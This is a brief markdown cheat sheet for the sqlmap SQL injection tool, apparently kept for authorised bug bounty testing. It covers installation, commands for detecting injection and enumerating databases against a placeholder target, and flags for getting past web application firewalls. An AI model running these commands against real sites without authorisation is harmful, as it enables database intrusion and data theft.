# sqlmap

## Repo
https://github.com/sqlmapproject/sqlmap

## Installation
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
# run: python3 sqlmap.py

# Package
sudo apt install sqlmap
```

## Using
```bash
# Basic GET
python3 sqlmap.py -u "https://target.com/page?id=1" --batch

# POST / forms
python3 sqlmap.py -u "https://target.com/login" --data "user=a&pass=b" --batch

# Crawl + forms
python3 sqlmap.py -u "https://target.com" --crawl=2 --forms --batch

# Database enumeration
python3 sqlmap.py -u "https://target.com/page?id=1" --dbs --batch
python3 sqlmap.py -u "https://target.com/page?id=1" -D dbname --tables --batch
```

## Current Step
SQL injection detection and exploitation on candidate parameters.

## Next Step
If confirmed, extract data carefully within program scope. Produce clean PoC for report.

## Errors Fixes
- WAF blocks → --tamper=space2comment,between --random-agent
- Connection issues → --timeout=15 --retries=3
- Missed detection → --level=5 --risk=3
- Python version → always use python3
